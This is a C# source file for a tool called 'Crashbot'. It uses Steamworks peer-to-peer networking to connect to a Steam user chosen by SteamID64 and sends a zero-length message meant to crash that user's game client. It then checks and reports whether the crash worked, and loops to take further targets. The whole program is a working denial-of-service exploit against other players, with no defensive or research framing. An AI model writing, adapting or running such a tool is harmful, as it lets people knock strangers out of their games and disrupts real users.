using Newtonsoft.Json;
using Steamworks;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using static SteamKit2.GC.Dota.Internal.CMsgDOTALeague;

namespace Crashbot
{
    internal class Program
    {
        private static readonly SteamNetworkingConfigValue_t[] LongTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutConnected,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 50 }
            }
        ];

        private static readonly SteamNetworkingConfigValue_t[] ConnectionTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 300 }
            }
        ];


        static void Main(string[] args)
        {
            Console.WriteLine("Crashbot");
            Environment.CurrentDirectory = Directory.GetParent(Assembly.GetExecutingAssembly()?.Location ?? AppContext.BaseDirectory)!.FullName;
            Console.WriteLine(Environment.CurrentDirectory);
            File.WriteAllText("steam_appid.txt", "387990");

            var proc = Process.GetCurrentProcess();
            if (!Steamworks.SteamAPI.Init())
            {
                proc.StandardOutput.DiscardBufferedData();
                Console.WriteLine("SteamAPI.Init() failed!");
                return;
            }
            else
            {
                proc.StandardOutput.DiscardBufferedData();
                Console.WriteLine("BLoggedOn: " + Steamworks.SteamUser.BLoggedOn());
            }

            Console.WriteLine("76561198299556567");


        start:

            Console.Write("Enter target SteamID64: ");
            ulong target = ulong.Parse(Console.ReadLine()?.Trim() ?? "0");
            
            var (conn, info) = ConnectAndWait(target, LongTimeoutOptions);
            if (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
                Console.WriteLine("Connected!");

            int maxMessages = 1;
            while (true)
            {
                IntPtr[] messagePointers = new IntPtr[maxMessages];
                int messageCount = Steamworks.SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, messagePointers, maxMessages);

                if (messageCount > 0)
                {
                    Steamworks.SteamNetworkingSockets.SendMessageToConnection(conn, 0, 0, 0, out long _);
                    Steamworks.SteamNetworkingSockets.FlushMessagesOnConnection(conn);
                    Console.WriteLine("Crashing client...");

                    Steamworks.SteamAPI.RunCallbacks();
                    Steamworks.SteamNetworkingSockets.RunCallbacks();
                    Thread.Sleep(100);

                    Steamworks.SteamNetworkingSockets.CloseConnection(conn, 0, string.Empty, false);
                    break;
                }
                else
                {
                    Thread.Sleep(10);
                }
            }

            Console.Write("Press any key to continue...");
            Console.ReadKey();

            var (conn2, info2) = ConnectAndWait(target, ConnectionTimeoutOptions);

            bool crashed = info2.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally;
            Console.WriteLine(crashed ? "Successfully Crashed!" : "Failed to Crash");

            goto start;
        }

        private static (HSteamNetConnection Connection, SteamNetConnectionInfo_t Info) ConnectAndWait(ulong target, SteamNetworkingConfigValue_t[] options)
        {
            var steamuser = new SteamKit2.SteamID(target);
            CSteamID cSteamID = new(steamuser.ConvertToUInt64());

            SteamNetworkingIdentity remoteIdentity = new();
            remoteIdentity.SetSteamID(cSteamID);

            HSteamNetConnection conn = SteamNetworkingSockets.ConnectP2P(ref remoteIdentity, 0, options.Length, options);
            Console.WriteLine("Connecting...");

            Thread.Sleep(10);
            Steamworks.SteamAPI.RunCallbacks();
            Steamworks.SteamNetworkingSockets.RunCallbacks();
            Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out Steamworks.SteamNetConnectionInfo_t info);

            int timeout = 200;
            while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
            {
                Steamworks.SteamAPI.RunCallbacks();
                Steamworks.SteamNetworkingSockets.RunCallbacks();
                Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out info);

                Thread.Sleep(10);
                timeout--;

                if (timeout <= 0)
                    break;
            }

            return (conn, info);
        }
    }
}
